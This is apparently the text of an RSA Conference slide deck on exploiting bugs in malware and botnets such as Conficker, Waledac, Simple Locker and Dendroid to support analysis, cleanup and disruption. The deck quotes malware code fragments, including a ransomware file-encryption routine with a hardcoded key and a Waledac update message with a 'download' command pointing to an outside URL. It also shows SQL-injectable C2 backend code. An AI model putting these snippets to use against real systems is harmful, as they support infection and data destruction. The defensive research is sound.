SESSION ID: HT-R01
Bug Hunting On The Dark Side
Felix Leder
Mobile Threat Research Blue Coat

Tillmann Werner
Technical Intelligence Analysis CrowdStrike

#RSAC

#RSAC
Status Quo ­ Defender's Dilemma
 Asymmetry of cyber attacks  Single mistakes lead to compromises  One successful intrusion is enough
2

#RSAC
Everybody Makes Mistakes.
3

#RSAC
Best Antivirus 2011

 Fake Antivirus Malware

 Makes your computer go crazy

 Attempts to detect virtual machines to evade analysis

 Error in the code results in this check to be always true

#include <intrin.h>

int cpuInfo[4];

__cpuid(cpuInfo, 1);
if (cpuInfo[2] = 0x80000000) { // hypervisor bit is set, VM detected ...
} 4

if (cpuInfo[2] == 0x80000000) {

#RSAC
Conficker ­ Infection Examples
5

#RSAC
Conficker ­ IP Address Calculation Bug
 "The rand function returns a pseudorandom integer in the range 0 to RAND_MAX."
 RAND_MAX is defined as the value 0x7fff.
Source: http://msdn.microsoft.com/en-us/library/2dfe3bzd%28VS.71%29.aspx
next_ip_lower_word = rand() next_ip_upper_word = rand()
6

#RSAC
Conficker - IP Address Calculation Bug
As a result, Conficker scans only
less than one quarter
of the whole IPv4 address range!
7

#RSAC
Stuxnet ­ Installation Routine
 Dropper targets specific Windows versions
(5  version AND version  6)
 Second condition is alway true
(5  version OR version  6)
void CheckOsVersionAndStart(void) { struct _OSVERSIONINFOW OsVersion;
OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
if ( GetVersionExW(&OsVersion) && OsVersion.dwPlatformId == VER_PLATFORM_WIN32_NT && (OsVersion.dwMajorVersion >= 5 || OsVersion.dwMajorVersion <= 6))
Install(); }
8

#RSAC
Turn the Tables on the Attackers.
9

#RSAC
Goals

 Attribution  Estimating attack impact  Enhanced detection  Incident recovery  Live tracking of new campaigns  Tracking down of individuals  Disarming attacker infrastructure

Effort

Analysis Remediation
Disruption

Passive Reactive Proactive

10

#RSAC
Analysis
11

#RSAC
Native Language Spam
12

#RSAC
Left-Over Debug Messages
 Language artifacts can help with attribution
13

#RSAC
Kelihos ­ Hidden Gems
14

#RSAC
Energetic Bear ­ A Russian APT

 Exfiltration data is cached locally, encrypted with RSA

 Private key structure stores all parameters
 Public key can be reconstructed
 Comes in handy during forensic analysis

modulus: 0x00000000 0x00000010 0x00000020 0x00000030 0x00000040 0x00000050 0x00000060 0x00000070

e7 90 31 c3 94 ef 9c 3a 0d f6 d3 c8 8a 0f f3 2d e4 05 80 9b e4 fe 67 47 93 9a 6f 72 e8 80 10 d8 0b a6 bc b2 2a 54 eb 6c 6f b4 72 2b 65 7c fe 0d 12 e3 01 bd fb ce ff f4 05 38 d6 0e ac a8 c9 03

2f fa ce a5 15 a1 a0 36 7e 43 93 31 2d f8 a6 cd 0e 38 21 16 5e 69 da 76 96 69 4c 58 56 d5 65 6a ce f7 86 30 c2 ab 53 86 c8 49 bb f5 cf 50 a2 4d 53 cb 6d 91 bd 87 40 cd fa 1f 2e eb d2 dc bf 9f

|..1....:/......6| |.......-~C.1-...| |......gG.8!.^i.v| |..or.....iLXV.ej| |....*T.l...0..S.| |o.r+e|...I...P.M| |........S.m...@.| |.8..............|

public exponent: 65537

exponent: 0x00000000 0x00000010 0x00000020 0x00000030 0x00000040 0x00000050 0x00000060 0x00000070

a4 2a 47 fd 7e 93 38 d0 72 65 f0 d3 15 7e 25 4a 3d fc e0 a6 a4 fb ef 40 9a ae 3c 20 dc d0 1e 21 ca 5c d7 ca 08 7c 30 6d 37 fa d9 ec 2f 0a 44 b5 f1 90 59 e9 9b b4 10 f5 a1 78 a6 30 71 d5 18 f5

cf bf 21 cd 4b be a0 14 b5 5f 36 f5 00 c0 6d 91 22 c6 8c 3e 8d 84 c2 0a 4e d1 2b fc dc e2 c0 d7 93 20 67 65 1a 1a 22 bc 84 6d 27 76 b1 13 89 53 e3 a8 f9 2a 6f 11 f5 46 e4 ac bf 87 52 7e 0b 01

|.*G.~.8...!.K...| |re...~%J._6...m.| |=......@"..>....| |..< ...!N.+.....| |.\...|0m. ge..".| |7.../.D..m'v...S| |..Y........*o..F| |.x.0q.......R~..|

15

#RSAC
Remediation
16

#RSAC
Storm Worm ­ A Custom HTTP User-Agent
 Original Storm Worm, 2008
GET / HTTP/1.1 Host: 127.43.2.101 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windoss NT 5.1; SV1921)
 Easily detectable, but they learned their lesson...  Modified version, April 2010
GET / HTTP/1.1 Host: 127.43.2.101 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windoss NT 5.1; SV1)
17

#RSAC
Conficker ­ A True Classic
 4 different versions  Each version removes all previous ones  Uninstall routine in last version is a blueprint for a removal tool
18

Simple Locker

 Locks the phone's screen  Ransom payable within 24h  C2 server hosted on TOR hidden service  Encrypts documents, images, movies

adb@generic:/sdcard # ls -l

-rwxrwx--- root

sdcard_r

-rwxrwx--- root

sdcard_r

-rwxrwx--- root

sdcard_r

-rwxrwx--- root

sdcard_r

-rwxrwx--- root

sdcard_r

-rwxrwx--- root

sdcard_r

16 2014-06-05 14:58 test.docx.enc 16 2014-06-05 14:53 test.jpg.enc
0 2014-06-05 14:53 test.mp3 16 2014-06-05 14:58 test.mp4.enc 16 2014-06-05 14:58 test.pdf.enc 16 2014-06-05 14:58 test.png.enc

19

#RSAC

#RSAC
Simple Locker ­ Encryption
 Encryption of files is where it hurts
public void encrypt() throws Exception { AesCrypt localAesCrypt; Iterator localIterator; if ((!this.settings.getBoolean("FILES_WAS_ENCRYPTED", false)) && (isExternalStorageWritable())) { localAesCrypt = new AesCrypt("jndlasf084hr"); localIterator = this.filesToEncrypt.iterator(); } for (;;) { if (!localIterator.hasNext()) { Utils.putBooleanValue(this.settings, "FILES_WAS_ENCRYPTED", true); return; } String str = (String) localIterator.next(); localAesCrypt.encrypt(str, str + ".enc"); new File(str).delete(); }
}
20

Simple Locker ­ Decryption
 AES is a symmetric cipher ­ recovery trivial
public void decrypt() throws Exception { AesCrypt localAesCrypt; Iterator localIterator; if (isExternalStorageWritable()) { localAesCrypt = new AesCrypt("jndlasf084hr"); localIterator = this.filesToDecrypt.iterator(); } for (;;) { if (!localIterator.hasNext())
return; } String str = (String) localIterator.next(); localAesCrypt.decrypt(str, str.substring(0, str.lastIndexOf(".")); new File(str).delete(); } }
21

#RSAC

#RSAC
Disruption
22

#RSAC
Zeus Dropzone
23

#RSAC
What's in there?
24

#RSAC
Cracking the Control Panel Admin Account
 Plaintext password is just an Internet search away
 Don't even have to consult Rainbow Tables
 Lack of security gives full access over the botnet
25

#RSAC
Yaludle
 Banking trojan  Built-in user-mode rootkit  Man-in-the-browser  Displays fake account data
26

#RSAC
Yaludle Backend ­ Sanitizing User Input

// Gettin all information $id = $_GET['id']; $httpport = $_GET['httpport']; $socksport = $_GET['socksport']; $uptimem = $_GET['uptimem']; $uptimeh = $_GET['uptimeh']; $param = $_GET['param']; $ver = $_GET['ver']; $uid = $_GET['uid']; $wm = $_GET['wm']; $lang = $_GET['lang']; //$ssip = $_GET['ssip'] ; $ip = getenv("REMOTE_ADDR"); $real_ip = getenv("HTTP_X_FORWARDED_FOR"); $browser = getenv("HTTP_USER_AGENT");
Source: http://software-security.sans.org/blog/2011/06/13/spot-the-vuln-feathers

//Replace symbols $id = ereg_replace("<","&#8249",$id); $id = ereg_replace(">","&#8250",$id); $id = ereg_replace("\"","&#8221",$id); $id = ereg_replace(";","",$id); $id = ereg_replace("%","",$id); $param = ereg_replace("<","&#8249",$param); $param = ereg_replace(">","&#8250",$param); $param = ereg_replace("\"","&#8221",$param); $param = ereg_replace(";","",$param); $param = ereg_replace("%","",$param);

27

#RSAC
Yaludle Backend ­ Do Whatever You Want

$link = mysql_connect($mysql_host, $mysql_login, $mysql_pass) or die("Could not connect: " . mysql_error());
mysql_select_db($mysql_db, $link) or die("Could not select : " . mysql_error());
$query = 'SELECT COUNT(*) FROM socks where uid = "'. $uid .'"'; $result = mysql_query($query, $link)
or die("Could not execute: " . mysql_error()); $count = mysql_result($result, 0); if ($count == 0) {
$query = 'INSERT INTO socks VALUES ("'.$uid.'", "'. $real_ip . '", "'. $httpport .'", "'. $socksport . '", "'. $sql_uptime .'", "'. mktime() .'", "0")';
$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error()); } else {
$query = 'UPDATE socks SET `ip` = "'. $real_ip .'", `hport` = "'. $httpport .'", `sport` = "'. $socksport .'", `uptime` = "'. $sql_uptime .'", `update` = "' . mktime() .'" WHERE `uid` = "'.$uid.'"';
$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error()); $query = 'COMMIT'; $result = mysql_query($query, $link) or die("Could not execute: " . mysql_error()); } mysql_close($link);

Source: http://software-security.sans.org/blog/2011/06/13/spot-the-vuln-feathers

28

#RSAC
Dendroid
 Construction kit with builder, goes for $300  Control panel  Repackaging of spy functions into existing apps
 Record phone calls  Remotely activate microphone and camera  Spy on SMS, call, browser history
29

#RSAC
Dendroid ­ "Prepared Statements"
 Database access can be vulnerable to SQL injection
$sql = "UPDATE bots SET uid='$uid' WHERE `id` = '$id'"; $result = $db->query($sql);
 Prepared statements differentiate between SQL and parameters
$sql = "UPDATE bots SET uid=:uid WHERE `id` = :id" $statement = $db->prepare($sql); $statement->execute(Array($uid, $id));
 Dendroid code
$sql = "UPDATE bot SET device='$Device', version='$Version', lati='$Lati', "; $sql.= "longi='$Longi', provider='$Provider', phone='$PhoneNumber',"; $sql.= "sdk='$SDK', random='$Random' WHERE `uid` = '$UID'"; $statement = $connect->prepare($sql);
$statement->execute(); 30

Waledac ­ Botnet Architecture
 Active since 2008 (until Feb. 2010)  Decentralized structure  Multiple tiers

#RSAC
Fast-Flux DNS

Bot Bot
Bot

Bot

Bot

Bot Bot

Bot

Bot

Bot

Bot

Bot
31

C2 Proxy C2 Proxy C2 Proxy

C2 Backend

#RSAC
Waledac ­ Protocol Layers

 RSA-encrypted session keys  Multiple stacked layers
application/x-www-form-urlencoded Base64
AES-CBC, IV:0 BZip XML
32

Certificate: Data: Version: 3 (0x2) Serial Number: 0 (0x0) Signature Algorithm: md5WithRSAEncryption Issuer: C=UK, CN=OpenSSL Group Validity Not Before: Jan 2 04:24:10 2009 GMT Not After : Jan 2 04:24:10 2010 GMT Subject: C=UK, CN=OpenSSL Group Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public Key: (1024 bit) Modulus (1024 bit): 00:d4:5a:7d:1f:bc:20:99:f4:77:6a:0a:04:25:ca: 71:29:59:3d:8d:61:c8:0e:9f:a2:c1:74:d8:6b:5f: e7:7b:47:13:d2:c1:9e:b0:c6:44:6d:21:9d:31:67: 7e:86:43:c2:b4:fe:42:fb:27:fd:04:95:03:bb:d3: 43:82:ca:6a:47:b7:fd:de:bf:a9:ea:71:ed:5e:69: 3c:0b:53:fa:a4:d4:50:87:ed:5d:02:73:4e:47:a4: a8:5e:ab:0c:fd:01:3c:5e:15:05:22:c4:63:f6:a6: 24:76:99:27:2a:e7:93:27:ad:b7:fd:1c:0f:e3:85: f0:d8:c8:39:32:11:c8:41:19 Exponent: 65537 (0x10001) Signature Algorithm: md5WithRSAEncryption 2e:e3:f8:b4:0d:ee:58:6e:25:51:12:9a:3e:4d:62:6b:c8:e6: d8:aa:83:19:f7:64:7e:02:45:ff:00:b0:82:3d:42:1a:61:78: 67:0c:44:f9:bb:02:da:bd:6e:e4:45:dd:af:02:4e:70:62:41: ef:81:67:17:a8:6c:41:92:a5:20:41:ee:e6:5b:38:22:b4:41: 26:de:f0:ec:2d:2c:e5:56:d4:05:22:40:bb:64:3d:ce:a4:c8: dd:76:b6:23:b8:2b:69:14:af:70:10:d8:7b:03:f6:b8:c2:90: 02:94:14:18:99:4d:cb:6e:8a:7a:71:49:05:b1:b9:2f:dc:0e: b1:c7

Waledac ­ Session Keys
 Two hardcoded keys
 Exchange of relay/peer ­ list  Client RSA public key to server
 Session keys
 Exchanged with RSA public key  Session key from server
New RSA-encrypted session key decrypts to: <9837b5d73b8ae670> New RSA-encrypted session key decrypts to: <9837b5d73b8ae670> New RSA-encrypted session key decrypts to: <9837b5d73b8ae670> New RSA-encrypted session key decrypts to: <9837b5d73b8ae670> New RSA-encrypted session key decrypts to: <9837b5d73b8ae670> ...
33

#RSAC 33

Waledac ­ Binary Updates
<lm> <v>27</v> <t>notify</t> <props> <p n="ptr">bonn-007.pool.t-online.de</p> <p n="ip">93.137.206.86</p> <p n="dns_ip">216.195.100.100</p> <p n="smtp_ip">209.85.201.114</p> <p n="http_cache_timeout">3600</p> <p n="sender_threads">35</p> <p n="sender_queue">2000</p> <p n="short_logs">true</p> <p n="commands"><![CDATA[312|download|http://orldlovelife.com/mon.jpg]]></p> </props> <dns_zone></dns_zone> <dns_hosts></dns_hosts> <socks5></socks5> <dos></dos> <filter></filter>
</lm>
34

#RSAC

#RSAC
Waledac ­ Becoming a Relay
 Either provide unrestricted Internet access for more than 45min
 Or use the command line switch
for ( i = 1; i < argc; ++i ) { current_arg_ptr = &argv[i]; if (stricmp(*current_arg_ptr, "-s") == 0) { mode = 0; } else if (stricmp(*current_arg_ptr, "-r") == 0) { mode = 1; } else if (stricmp(*current_arg_ptr, "-update") == 0) { if (i < argc - 3) { Status = 2; DownloadAndRun(argv[i + 3); return 0; } }
}
35

Waledac ­ Attacking the Botnet
 Peer-to-peer poisoning  Man-in-the-middle attack

#RSAC
Fast-Flux DNS

Bot Bot
Bot

Bot

Bot

Bot Bot

Proxy

Bot

Bot

Bot

Bot

36

C2 Proxy C2 Proxy C2 Proxy

C2 Backend

#RSAC
Conficker.A ­ GeoLocation Lookups of Targets
 The malware checks a potential victim`s geographic location  Public GeoIP database downloaded upon startup  If a system is located in Ukraine, Conficker would skip it
37

#RSAC
Conficker.A ­ Propagation Stopped
 Specially crafted database maps all IP addresses on Ukraine
 Effectively stopped the malware from propagating
38

#RSAC
Apply
39

#RSAC
Apply

 Analysis  Understand attacks and gain extended visibility into attacker`s actions  Check for unintended traces and artifacts (attribution, detection, ...)  External interfaces, like logging and command line switches

 Remediation  Exploit unique data patterns  Leverage removal and cleanup concepts  Recover status from before an infection
 Disruption  Disable architecture  Track down individuals and new campaigns

Apply Online

40

#RSAC
Summary
41

#RSAC
Summary
 Attackers exploit the asymmetry
 All software contains bugs
 Defenders can turn the tables on adversaries  Analysis  Remediation  Disruption
42

